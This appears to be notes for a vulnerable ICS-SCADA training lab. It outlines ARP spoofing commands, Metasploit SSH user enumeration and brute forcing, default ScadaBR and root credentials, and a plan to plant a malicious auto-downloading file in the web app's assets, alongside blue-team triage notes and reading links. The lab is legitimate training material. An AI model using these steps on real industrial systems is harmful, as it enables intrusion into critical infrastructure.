# ICS-SCADA-Vulnerable-Virtual-Lab
A simple purely virtualized vulnerable ICS-SCADA lab. 
------
To do:
* See how to manipulate html files through ssh so
  machines automatically download/execute a malicious file
------
Blue team:
- think PUFNTALR
Processes (meterpreter)
Users currently logged on (root)
Files of interest (http images, sql databases)
Network connections (meterpreter reverse tcp)
Tasks (malware in startup?)
Accounts and access modified (scadabr now has admin rights)
Logs
Registry

---------------------
arpspoof -i eth0 -t 10.0.3.16 10.0.3.8
arpspoof -i eth0 -t 10.0.3.8 10.0.3.16

sysctl -w net.ipv4.ip_forward=1
---------------------------------------
once ssh, maybe
find / | grep login | more
Something else to consider, once in ssh, start
looking for files pertaining to the website.
Perhaps what you can do is insert a malicious
file that automatically downloads upon entering
a webpage. Look at the source info of the
page (login page for example) and look at
the different paths in the system. Example
/images/mangoLogoMed.jpg
$find / | grep mangoLogoMed
//then modify it
/opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/images
download mangoLogoMed.jpg /home/kali/Desktop/scadabr
***Interesting folder,where all the juice is!
/opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/WEB-INF/jsp
-------
uploading files directly with ssh:
scp fileName user@remotehost:/home/username/destination
//https://phoenixnap.com/kb/linux-ssh-commands#:~:text=Introduction,is%20at%20a%20high%20level.
----------
Once ssh with root, go to your favorite folder (/opt) and type
$grep -R1 "your string" ./ | more
to look for strings inside the files
-i = ignore text case
-R = recursively search files in subdirectories
-l = show file names instead of file content portions

-----
ssh:
//blue team - look at /var/log/auth.log
//$cat /var/log/auth.log | tail -n 30
//look at ip, perhaps | grep sshd
msf > use auxiliary/scanner/ssh/ssh_enumusers
//set USERNAME root, run
//set USERNAME admin, run
//set USERNAME ScadaBR, run
$crunch 7 scadabr > crunch.txt
msf > use auxiliary/scanner/ssh/ssh_login
//after finding out the credentials
msf > use multi/ssh/sshexec

$ssh scadabr@10.0.3.16
//password: scadabr 

//root account is root::scadabr
----------------------
$cd /
$find . | grep http
-------------
https://www.tecmint.com/35-practical-examples-of-linux-find-command/
find / - name login*
This has your source files
$/opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/WEB-INF/jsp
Example, below coincides with a snippet of our login source page code
(line 168 - 252)
$cat /opt/tomcat6/apache-tomcat-6.0.53/webapps/ScadaBR/WEB-INF/jsp/login.jsp
-----
RESOURCES
----
Vulnerabilities of ICS (best source - site attacks, XXS, DoS, etc)
(look at attacks and vulnerabilities)
https://nps.primo.exlibrisgroup.com/permalink/01NPS_INST/1gqbqb3/wilbooks10.1002%252F9781119644538.ch5

Good too - Cybersecurity for Industrial Control Systems
https://nps.primo.exlibrisgroup.com/permalink/01NPS_INST/1gqbqb3/crc_bkTANDF_198979

SCADA systems cyber vulns
https://electricenergyonline.com/energy/magazine/181/article/SCADA-System-Vulnerabilities-to-Cyber-Attack.htm

